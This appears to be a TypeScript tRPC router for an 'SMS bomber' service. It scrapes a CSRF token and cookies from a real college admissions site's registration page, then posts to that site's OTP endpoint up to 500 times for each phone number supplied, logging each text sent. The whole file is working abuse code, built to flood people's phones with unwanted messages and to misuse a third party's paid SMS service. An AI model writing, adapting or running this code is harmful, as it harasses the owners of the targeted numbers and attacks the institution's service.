import { protectedProcedure, router } from '../init';
import { z } from 'zod';
import * as cheerio from 'cheerio';

export const bombRouter = router({
  start: protectedProcedure
    .input(
      z.object({
        numbers: z.array(z.string()).min(1),
        repeat: z.number().min(1).max(500),
      })
    )
    // Async generator for SSE updates
    .subscription(async function* ({ input, ctx }) {
      const { numbers, repeat } = input;
      const BASE = 'https://apply.sjcetpalai.ac.in';
      const REGISTER_URL = `${BASE}/register`;
      const OTP_URL = `${BASE}/send-registration-otp`;

      yield { type: 'log', message: 'Fetching fresh session...', success: 0, failed: 0 };

      // We need to fetch tokens.
      const registerRes = await fetch(REGISTER_URL, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          Accept: 'text/html,application/xhtml+xml',
        },
      });

      if (!registerRes.ok) {
        yield { type: 'error', message: `Failed to load session: ${registerRes.statusText}`, success: 0, failed: 0 };
        return;
      }

      const html = await registerRes.text();
      const $ = cheerio.load(html);
      const csrf = $('input[name="_token"]').val() as string;

      // Extract cookies
      const setCookieHeaders = registerRes.headers.getSetCookie();
      let cookieString = '';
      if (setCookieHeaders && setCookieHeaders.length > 0) {
        cookieString = setCookieHeaders.map((c) => c.split(';')[0]).join('; ');
      }

      yield { type: 'log', message: 'Session got', success: 0, failed: 0 };
      yield { type: 'log', message: `Token: ${csrf?.substring(0, 25)}...`, success: 0, failed: 0 };
      yield { type: 'log', message: '', success: 0, failed: 0 };

      const headers = {
        'X-Requested-With': 'XMLHttpRequest',
        Origin: BASE,
        Referer: REGISTER_URL,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        Accept: 'application/json',
        Cookie: cookieString,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      };

      let successCount = 0;
      let failedCount = 0;

      for (const num of numbers) {
        yield { type: 'log', message: `Sending sms to ${num}`, success: successCount, failed: failedCount };

        for (let i = 0; i < repeat; i++) {
          try {
            const body = new URLSearchParams({
              _token: csrf,
              mobile: num,
            });

            const r = await fetch(OTP_URL, {
              method: 'POST',
              headers,
              body: body.toString(),
            });

            const resData = await r.json().catch(() => null) as any;

            if (r.ok && resData?.success) {
              successCount++;
              console.info(`[SMS BOMB] Success -> ${num} (Attempt ${i+1}/${repeat})`);
              yield {
                type: 'progress',
                message: `  [${i + 1}] ✓ ${resData?.message || 'Success'}`,
                success: successCount,
                failed: failedCount,
              };
            } else {
              failedCount++;
              console.warn(`[SMS BOMB] Failed -> ${num} (Attempt ${i+1}/${repeat}): Status ${r.status}`);
              yield {
                type: 'progress',
                message: `  [${i + 1}] ✗ ${r.status} ${JSON.stringify(resData)}`,
                success: successCount,
                failed: failedCount,
              };
            }
          } catch (e: any) {
            failedCount++;
            console.error(`[SMS BOMB] Error -> ${num}: ${e.message}`);
            yield {
              type: 'progress',
              message: `  [${i + 1}] ERROR ${e.message}`,
              success: successCount,
              failed: failedCount,
            };
          }
        }
        yield { type: 'log', message: '', success: successCount, failed: failedCount };
      }

      yield { type: 'log', message: 'Completed.', success: successCount, failed: failedCount };
    }),
});
